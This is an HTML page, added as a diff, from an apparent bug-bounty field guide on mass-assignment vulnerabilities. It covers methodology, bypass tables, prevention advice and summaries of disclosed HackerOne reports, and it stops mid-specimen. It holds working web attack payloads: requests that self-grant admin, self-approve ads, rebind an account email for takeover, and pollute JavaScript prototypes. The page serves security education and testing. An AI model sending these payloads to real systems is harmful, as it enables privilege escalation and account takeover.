@@ -1,0 +1,409 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Mass Assignment · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>Mass Assignment</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="on" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Vulnerabilities</div>
+      <h1>Mass Assignment</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>16</b></span><a class="chip lab" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>API testing</b></a></div>
+    </header>
+    <div class="thin-note">⚠ Thin coverage — only 16 disclosed reports for this class; illustrative, not exhaustive.</div>
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>Mass assignment (a.k.a. <em>autobinding</em> / <em>over-posting</em>) happens when a create or update endpoint binds attacker-supplied request keys <strong>straight onto a server object</strong> with no field allowlist. The UI submits <code>name</code> and <code>bio</code>; the controller does <code>model.update(request.body)</code>; so you append one extra key the UI never sends — <code>admin</code>, <code>role</code>, <code>status</code>, <code>approval</code>, <code>visibility</code>, <code>permissions</code>, or the account's own <code>email</code> — and the server dutifully writes it.</p>
+<p>The core mechanism is a <strong>trust mismatch between the client-drawn form and the server-side model</strong>. Frameworks that map a request body onto a record (Rails, Node ORM binding via Mongoose/Sequelize, Meteor <code>insert</code>, Spring MVC data binding, Laravel <code>$fillable</code> gaps) will happily set <em>server-authoritative</em> attributes if the developer forgot to constrain which keys are bindable. One extra JSON key silently rewrites state the UI presented as read-only or absent: self-promote to admin, self-approve a paid campaign, or rebind the recovery anchor and take the account over. A sibling family — <strong>prototype pollution</strong> — is the same bug in JavaScript: a recursive merge/set walks attacker keys onto an object without excluding <code>__proto__</code>, mass-assigning onto <code>Object.prototype</code> itself.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Read the object first — the response <em>is</em> the schema.</strong> <code>GET</code> the resource and record every attribute name. Fields the read exposes but the write form omits are your prime candidates (<code>admin_approval</code>, <code>effective_status</code>, <code>role</code>, <code>email</code>, <code>visibility</code>…).</li><li><strong>Diff read vs. write.</strong> Compare the <code>GET</code> body against the <code>POST/PATCH</code> body the UI actually sends. The delta is the set of fields the server manages and the client "shouldn't" touch — try touching them.</li><li><strong>Enumerate privileged keys.</strong> Replay the normal write and append best-first guesses (see the canary list below). Keep every legitimate field the UI sent; add one privileged key at a time so you know which one bound.</li><li><strong>Prove persistence, not echo.</strong> Re-<code>GET</code> the object — ideally on an <strong>independent backend</strong> (a different REST route or GraphQL query). A field mirrored back in the write response may be a harmless echo; only a re-read on another path proves it was persisted.</li><li><strong>Escalate to impact.</strong> A bound <code>admin</code>/<code>role</code>/<code>approval</code> field is already the finding; a bound <code>email</code> chains to account takeover; a bound <code>__proto__</code> chains to XSS/RCE/DoS.</li></ol>
+<div class="pre" data-lang="http"># 1. Read the object, capture every attribute name
+GET /api/v2.0/accounts/ID/ads/AD_ID
+# response reveals: admin_approval, effective_status, configured_status, ...
+
+# 2. Replay the normal write, appending privileged keys (best-first):
+#    admin  is_admin  role  user_type  is_staff  owner  owner_id  permissions[]
+#    status  active  state  public  approval  admin_approval  effective_status
+#    verified  visibility  plan  price  seats  votes  package_name</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>The privileged field's exact name is almost always already visible to you — it's in the <code>GET</code> response for the same object, or leaked in a listing endpoint. Do not guess blindly if a read gives you the real schema (a <code>team_members</code> listing leaked the caller's own object id and an <code>is_admin</code> flag in #42961, which pointed straight at the writable role key).</div></div>
+<h2 class="sec" id="technique-variants"><span class="tick">§</span>Technique variants</h2>
+<p>Group your write request by <em>what</em> you are trying to overwrite; the mechanism is identical, only the field and endpoint change.</p>
+<h3 class="sub" id="self-promote-on-account-profile-update">Self-promote on account/profile update</h3>
+<p>The account's own model is bound whole on a profile save. Add the role/privilege field you saw in the read response. Watch the <code>Content-Type</code> — some stacks filter form-encoded params but auto-bind the JSON path.</p>
+<div class="pre" data-lang="http">POST /account/update HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+X-CSRF-Token: VALID
+
+{"name":"cur","bio":"cur","admin":true}</div>
+<h3 class="sub" id="server-authoritative-workflow-state-fields">Server-authoritative workflow / state fields</h3>
+<p><code>status</code>, <code>approval</code>, <code>effective_status</code>, <code>configured_status</code>, <code>active</code> are meant to be set only by review/payment/moderation logic. If a PATCH honors them, you skip the gate — self-approve, publish without review, activate without paying.</p>
+<div class="pre" data-lang="http">PATCH /api/v2.0/accounts/ID/ads/AD_ID HTTP/1.1
+Content-Type: application/json
+
+{"data":{"configured_status":"ACTIVE","effective_status":"ACTIVE","admin_approval":"APPROVED"}}</div>
+<h3 class="sub" id="rebind-the-recovery-anchor-email-the-ato-variant">Rebind the recovery anchor (email) — the ATO variant</h3>
+<p>A field the UI renders read-only is frequently <em>not</em> protected server-side, and often a <strong>sibling</strong> endpoint writes it with weaker checks than the dedicated one (the <code>/password</code> route enforces old-password; the <code>/bio</code> route rebinding <code>email</code> enforces nothing). Rebind <code>email</code>, then chain forgot-password.</p>
+<div class="pre" data-lang="http">POST /account/info/bio/v1 HTTP/1.1
+x-auth-token: VICTIM_TOKEN
+Content-Type: application/json
+
+{"first_name":"cur","last_name":"cur","email":"attacker@COLLAB","role":"OWNER"}</div>
+<h3 class="sub" id="client-dictated-create-fields-permissions-entitlements">Client-dictated create fields (permissions / entitlements)</h3>
+<p>On <em>create</em>, the object is built from the body with no allowlist. Supply the privileged attribute the server should compute: a full <code>permissions[]</code> array, a premium-only <code>visibility</code>, or Meteor-style <code>state</code>/<code>public</code>/<code>votes</code> on an <code>insert</code>.</p>
+<div class="pre" data-lang="http">POST /ORG/stores/create_managed_store HTTP/1.1
+Content-Type: application/json
+
+{"message":"","permissions":["applications","customers","orders","edit_orders","view_billing_details","edit_private_apps"],"store_domain":"myStore1"}</div>
+<div class="pre" data-lang="http"># Entitlement gated only in the UI — send it verbatim, server never re-checks the plan
+POST /workspaces/WORKSPACE_ID/projects HTTP/1.1
+Content-Type: application/json
+
+{"description":"x","visibility":"Personal","initial_message":{"message":"x","files":[]}}</div>
+<h3 class="sub" id="registration-role-type">Registration role/type</h3>
+<p>Self-registration binds a client-supplied <code>user_type</code>/<code>role</code>. Enumerate integer tiers to find the privileged one; you self-provision an admin at signup.</p>
+<div class="pre" data-lang="http">POST /newuser.cfm?loc_class=L HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user_type=4&amp;fname=Test&amp;lname=Test&amp;ssn=VALID_UNUSED_SSN</div>
+<h3 class="sub" id="graphql-input-objects">GraphQL Input objects</h3>
+<p>A GraphQL <code>Input</code> type routinely accepts more fields than the form submits. Dump the Input type with <strong>introspection</strong>, then inject a staff-only field. Verify with the matching query.</p>
+<div class="pre" data-lang="graphql">mutation AutosavePentestOpportunity($input: AutosavePentestOpportunityInput!) {
+  autosavePentestOpportunity(input: $input) { was_successful }
+}
+# add to $input:  "package_name": "premium_p80"</div>
+<h3 class="sub" id="forced-browse-targets-no-edit-ui-no-controller">Forced-browse targets (no edit UI ≠ no controller)</h3>
+<p>An object hidden from the UI still has a standard REST route. Guess <code>/{resource}/{id}/edit</code>, diff a normal update body, and append the privileged attribute (<code>admin</code>, <code>role</code>, <code>owner</code>). The change can be <em>invisible</em> to other admins if the column isn't rendered for that object type.</p>
+<div class="pre" data-lang="http">POST /users/USER_ID HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user[email]=attacker@COLLAB&amp;user[admin]=1</div>
+<h3 class="sub" id="prototype-pollution-recursive-property-write-sink">Prototype pollution (recursive property-write sink)</h3>
+<p>The JavaScript incarnation: any deep-merge / <code>extend</code> / clone / dotted-path setter that walks attacker keys without excluding <code>__proto__</code> mass-assigns onto <code>Object.prototype</code>. Use <code>JSON.parse</code> so <code>__proto__</code> is a real own enumerable key (a literal <code>{__proto__:…}</code> just sets the prototype and won't reproduce it).</p>
+<div class="pre" data-lang="js">// deep-merge sink ($.extend deep, lodash merge, dot-prop, ...):
+merge({}, JSON.parse('{"__proto__":{"polluted":true}}'));
+console.log({}.polluted); // true  -&gt; pollutes Object.prototype
+
+// dotted-path setter sink:
+set(obj, '__proto__.isAdmin', true);
+console.log({}.isAdmin);  // true</div>
+<div class="callout note"><span class="ico">● NOTE</span><div>Prototype pollution is not server-only. A front-end library that deep-merges config you can influence (chart datasets/options, plugin settings) is a <em>client-side</em> PP sink, and it frequently escalates to DOM XSS when a later gadget reads the polluted property into an HTML/attribute sink.</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Rails strong-params <code>permit</code></td><td><code>params.each</code> / <code>.map</code> / <code>.to_a</code> yields the <strong>unfiltered</strong> hash, re-exposing unpermitted keys (CVE-2020-8164)</td><td>#292797</td></tr><tr><td>Rails nested-attr <code>:reject_if</code></td><td>add <code>_destroy=1</code> to the nested object — skips <code>reject_if</code>; with <code>allow_destroy:false</code> the rejected values are written anyway (CVE-2015-7577)</td><td>#90457</td></tr><tr><td>Form-encoded param filter</td><td>resend as <code>Content-Type: application/json</code> — the JSON path auto-binds where the form path filtered</td><td>#42961</td></tr><tr><td>UI read-only field</td><td>write it via a <strong>sibling</strong> REST endpoint; protection asymmetry (<code>/password</code> guarded, <code>/bio</code> not)</td><td>#3766455</td></tr><tr><td>No edit UI for the object</td><td>hit the standard <code>/{resource}/{id}/edit</code> route directly; it still accepts privileged params</td><td>#962895</td></tr><tr><td>Coarse "can edit" authz</td><td>tamper a hidden <code>status</code>/state input the single edit-permission gates without its own check</td><td>#3678828</td></tr><tr><td><code>__proto__</code> string blacklist</td><td>retry via the <code>constructor.prototype.X</code> traversal path</td><td>#968355</td></tr><tr><td>Deep-merge guard</td><td>sink lacks a <code>hasOwnProperty</code> check on the target key → recurses into <code>__proto__</code></td><td>#776371</td></tr><tr><td>Non-merge PP sink</td><td>pass <code>__proto__</code> as a key-list arg to a formatter (<code>console.table</code> properties, CVE-2022-21824)</td><td>#1431042</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>A write that echoes your privileged field back in the <em>response</em> is not proof of impact — it may be a harmless round-trip. Always confirm on an <strong>independent read path</strong> (a different backend or a GraphQL query) that the value actually persisted before you claim mass assignment.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<ul><li><strong>Mass-assign email → forgot-password → account takeover.</strong> Write the recovery anchor, request a reset to your inbox, set a password with no old-password step-up: a brief session-token hold becomes permanent takeover (#3766455).</li><li><strong>Forced browse → mass assignment → persistent backdoor.</strong> Edit a UI-hidden user, set an attacker email, append <code>admin=1</code>; the account is invisible in the user list because <code>admin</code> isn't rendered for that type (#962895).</li><li><strong>Self-register as admin → PII/SSN disclosure → full app takeover</strong> when the privileged tier reads everyone's data (#796379).</li><li><strong>Workflow-gate bypass</strong> — self-approve/publish/activate without review or payment (#1543159), or unlock a paid-tier feature the server never re-validated (#3370430).</li><li><strong>Prototype pollution → gadget.</strong> Pollute a default option/flag, or a property later read into a template/HTML sink → <strong>DOM XSS</strong>; an opts/shell sink → RCE; weak-control variants → DoS. See the XSS page for the DOM-sink half of the chain.</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Allowlist bindable fields</strong> — Rails strong-params <code>permit</code>, explicit DTOs, field maps. Never bind the request body onto the model wholesale. Beware enumerator leaks (<code>params.each</code>) that defeat the allowlist.</li><li><strong>Authorize each sensitive field separately.</strong> A coarse "can edit this object" check must not implicitly gate <code>status</code>, <code>admin</code>, or <code>approval</code> — each server-authoritative attribute deserves its own check.</li><li><strong>Enforce entitlements and state server-side</strong>, not merely in the UI; re-validate the caller's plan/role before honoring <code>visibility</code>/<code>plan</code>/<code>package_name</code>.</li><li><strong>Step-up + confirm-to-new-address</strong> on email/recovery changes; guard every endpoint that can write the recovery anchor as strictly as the password endpoint.</li><li><strong>Prototype pollution:</strong> use null-prototype maps or <code>Map</code>, reject <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> keys, and <code>hasOwnProperty</code>-check the target before recursing.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Suite</strong> — Repeater for the read/write diff; <strong>Match &amp; Replace</strong> to inject a fixed privileged key across every request; <strong>Intruder</strong> to enumerate integer role tiers (<code>user_type=1..N</code>).</li><li><strong>Arjun</strong> / <strong>param-miner</strong> — discover hidden, bindable parameters the UI never sends.</li><li><strong>GraphQL introspection</strong> (graphql-voyager, InQL) — dump <code>Input</code> types to find staff-only fields.</li><li><strong>Browser DevTools</strong> — capture the exact <code>GET</code> schema and the <code>POST/PATCH</code> body to diff by hand.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>16</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-796379" style="--sv:var(--sev-crit)" data-sev="4" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Privilege escalation by tampering role parameter at registration</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#796379</b> · deptofdefense · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>self-register as admin -&gt; read all applicants' PII/SSNs -</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The registration request accepts a client-supplied user_type/role parameter that the server trusts, so submitting a privileged value self-provisions an administrator account.</p>
+<h4>Method</h4><ol><li>Start a normal self-registration and intercept the submit request</li><li>Change user_type to a privileged value (e.g. 4)</li><li>Complete registration and log in with administrator access to all applicant PII/SSNs</li></ol>
+<div class="pre">POST /.../newuser.cfm?loc_class=L
+...&amp;user_type=4&amp;fname=Test&amp;lname=Test&amp;ssn=VALID_UNUSED_SSN</div>
+<p class="insight"><b>Insight —</b> Intercept every account-creation/profile-update request and look for role/type/is_admin/permission fields to overwrite (mass assignment). Servers frequently bind whatever the client sends. Enumerate role integer values to find privileged tiers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/796379" target="_blank" rel="noopener">hackerone.com/reports/796379</a></span><a class="src" href="#report-796379" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1543159" style="--sv:var(--sev-high)" data-sev="3" data-votes="189" data-bounty="5000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client sets server-owned approval/status fields</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1543159</b> · reddit · 5000 · 189 votes · resolved</div>
+<div class="taxo"><span>Program <b>reddit</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The ads PATCH endpoint accepted admin_approval and effective_status in the body and honored them, letting a user self-approve a campaign and mark it ACTIVE without review or payment.</p>
+<h4>Method</h4><ol><li>Create a campaign (status PENDING)</li><li>PATCH the ad with {configured_status:ACTIVE, effective_status:ACTIVE, admin_approval:APPROVED}</li><li>Campaign goes live, approval email received, no payment/review</li></ol>
+<div class="pre">PATCH /api/v2.0/accounts/&lt;id&gt;/ads/&lt;id&gt;
+{"data":{"configured_status":"ACTIVE","effective_status":"ACTIVE","admin_approval":"APPROVED"}}</div>
+<p class="insight"><b>Insight —</b> Enumerate object fields (from GET responses) and try setting server-authoritative workflow fields (approval, status, role, is_admin, verified, price) in write requests. Mass-assignment of state fields bypasses review/payment gates.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1543159" target="_blank" rel="noopener">hackerone.com/reports/1543159</a></span><a class="src" href="#report-1543159" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-968355" style="--sv:var(--sev-high)" data-sev="3" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution __proto__ blacklist bypass via constructor.prototype</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#968355</b> · nodejs-ecosystem · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A deep-merge guard that only skips the literal key '__proto__' still recurses into 'constructor' and 'prototype', so the payload constructor.prototype.X reaches Object.prototype and pollutes it despite the blacklist.</p>
+<h4>Method</h4><ol><li>Identify a merge/extend sink that appears patched because it rejects __proto__.</li><li>Send the alternate traversal path through constructor.prototype instead.</li><li>Confirm pollution on a fresh object.</li></ol>
+<div class="pre">// i18next deepExtend skips '__proto__' only:
+deepExtend({}, JSON.parse('{"constructor":{"prototype":{"polluted":true}}}'), true);
+console.log({}.polluted); // true
+
+// path-setter form (property-expr):
+setter('constructor.prototype.isAdmin')(obj, true);
+console.log({}.isAdmin); // true</div>
+<p class="insight"><b>Insight —</b> When a __proto__ filter exists, always retry with constructor.prototype (and mix key casing/Unicode). A blacklist that names only __proto__ is almost always incomplete. Proper fixes null-proto the map, use Map, or reject constructor/prototype and hasOwnProperty-check before recursing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/968355" target="_blank" rel="noopener">hackerone.com/reports/968355</a></span><a class="src" href="#report-968355" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-90457" style="--sv:var(--sev-high)" data-sev="3" data-votes="9" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Rails _destroy flag bypasses reject_if validation (CVE-2015-7577)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#90457</b> · rails · awarded · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>rails</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">In accepts_nested_attributes_for, the presence of a _destroy flag skipped the :reject_if proc on the assumption the record would be destroyed; when allow_destroy:false the record is NOT destroyed, so rejected/invalid nested changes get applied anyway.</p>
+<h4>Method</h4><ol><li>Find a form/endpoint using accepts_nested_attributes_for with reject_if and allow_destroy:false</li><li>Submit nested attributes that reject_if would normally reject, plus _destroy=1 (or true)</li><li>reject_if is skipped, allow_destroy:false prevents deletion, so the otherwise-rejected values are written</li></ol>
+<div class="pre"># nested params that reject_if would block, smuggled past it:
+user[posts_attributes][0][title]=&lt;invalid/blank&gt;
+user[posts_attributes][0][_destroy]=1</div>
+<p class="insight"><b>Insight —</b> When testing Rails nested attributes / mass-assignment, always add a _destroy parameter to nested objects; it can flip validation logic and let you clear or set fields the app intended to reject.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/90457" target="_blank" rel="noopener">hackerone.com/reports/90457</a></span><a class="src" href="#report-90457" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3766455" style="--sv:var(--sev-med)" data-sev="2" data-votes="70" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>UI-locked email editable via API mass-assignment -&gt; password-reset ATO chain</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3766455</b> · yelp · awarded · 70 votes · resolved</div>
+<div class="taxo"><span>Program <b>yelp</b></span><span>Surface <b>api</b></span><span>Chain <b>session token -&gt; mass-assign email -&gt; forgot-password </b></span><span>Tag <b>graphql</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A profile/bio API accepts and applies an 'email' field with no current-password/step-up and no confirmation-to-new-address, even though the UI renders email as read-only and the dedicated password endpoint does enforce old_password; the change silently rebinds the account recovery anchor.</p>
+<h4>Method</h4><ol><li>Capture the Save request of the account screen: POST /account/info/bio/v1 with x-auth-token</li><li>Add "email":"attacker@example.com" to the JSON body and send</li><li>Confirm on an independent backend (GraphQL GetAccountInfo) that private.email changed -&gt; persisted, not echoed</li><li>Chain: POST /account/forgot_password/v1 for the new email, receive the reset link at attacker inbox, set a new password (no old password needed), log in</li></ol>
+<div class="pre">POST https://biz-app.yelp.com/account/info/bio/v1
